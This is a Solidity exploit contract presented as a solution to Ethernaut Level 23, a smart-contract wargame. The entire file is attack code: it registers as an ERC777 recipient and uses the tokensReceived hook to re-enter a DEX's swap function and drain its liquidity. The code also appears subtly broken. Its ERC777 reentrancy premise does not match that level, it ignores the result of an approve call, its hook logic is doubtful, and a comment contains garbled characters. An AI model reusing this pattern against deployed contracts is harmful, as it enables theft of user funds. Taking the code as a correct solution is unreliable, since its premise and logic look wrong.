// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function addLiquidity(address tokenAddress, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

/**
 @title Dex2Exploit
 * @notice Ethernaut Level 23: ERC777 tokensReceived hook exploit
 * @dev Uses ERC777 hook to drain DEX via reentrancy during swap
 */
contract Dex2Exploit {
    IDex public target;
    address public token1;
    address public token2;
    bool private reentering;
    
    // ERC1820 registry interface hash for ERC777TokensRecipient
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    
    constructor(address _target) {
        target = IDex(_target);
    }
    
    /**
     * @notice Register as ERC777 recipient to receive hooks
     */
    function register() external {
        IERC1820Registry registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
        registry.setInterfaceImplementer(
            address(this), 
            TOKENS_RECIPIENT_INTERFACE_HASH, 
            address(this)
        );
    }
    
    /**
     * @notice ERC777 tokensReceived hook - reentrancy entry point
     */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (reentering) return;
        
        // During swap, we receive tokens. Re-enter to drain more.
        reentering = true;
        
        // Continue swapping if there's liquidity
        uint256 targetBalance = target.balanceOf(msg.sender, address(target));
        if (targetBalance > 1) {
            // Swap received tokens for the other token
            address otherToken = msg.sender == token1 ? token2 : token1;
            target.swap(msg.sender, otherToken, amount);
        }
        
        reentering = false;
    }
    
    /**
     * @notice Execute the reentrancy attack
     */
    function attack(address _token1, address _token2) external {
        token1 = _token1;
        token2 = _token2;
        
        // Approve and trigger first swap
        (bool success, ) = token1.call(
            abi.encodeWithSignature("approve(address,uint256)", address(target), type(uint256).max)
        );
        
        // Start the swap â†’ reentrancy chain
        target.swap(token1, token2, 1);
    }
}
